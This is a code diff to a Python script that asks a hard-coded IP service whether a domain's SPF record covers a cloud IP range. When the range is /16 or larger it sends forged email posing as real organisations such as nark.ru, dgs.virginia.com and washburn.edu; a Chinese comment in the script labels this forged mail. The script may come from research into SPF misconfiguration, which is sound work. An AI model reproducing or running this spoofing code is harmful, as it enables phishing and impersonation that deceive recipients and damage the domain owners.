@@ -84,31 +84,30 @@ def send_mail(from_domain, to_list):
 
     
 def check_and_send_email():
-    burp0_url = "http://202.112.51.56:31247/check?m=cloudip"
+    burp0_url = "http://202.112.51.56:31248/check?m={m}&s={s}".format(m=method, s=source)
     burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.83 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7", "Connection": "close"}
     r = requests.get(burp0_url, headers=burp0_headers)
     print(r.text)
     ans = json.loads(r.text)
     
-    # choose the shortest domain to show the result
-    domain_list = ans['domains']
-    domain_list = domain_list.split()
-    minlen = len(domain_list[0])
-    from_domain = domain_list[0]
-    for domain in domain_list:
-        if len(domain) < minlen:
-            minlen = len(domain)
-            from_domain = domain
 
     if ans['status'] == 'True':
         print("yes")
-        send_mail('dgs.virginia.com', mailto_list)
-        # send_mail('polycom.com', mailto_list)
-        # send_mail(from_domain, mailto_list)
+        
+        cidr = ans['cidr']
+        print(cidr)        
+        # send_mail('washburn.edu', mailto_list)
+        # 默认cidr>=16 发送伪造邮件
+        if cidr >= 16:
+            res = json.loads(ans['domains'])
+            for domain in res:
+                if domain["cidr"] == cidr:
+                    from_domain = domain["domain"]           
+            send_mail(from_domain, mailto_list)
     else:
         print("false")
 
-# send_mail('nark.ru', mailto_list)
-check_and_send_email()
+send_mail('nark.ru', mailto_list)
+# check_and_send_email()
 
 
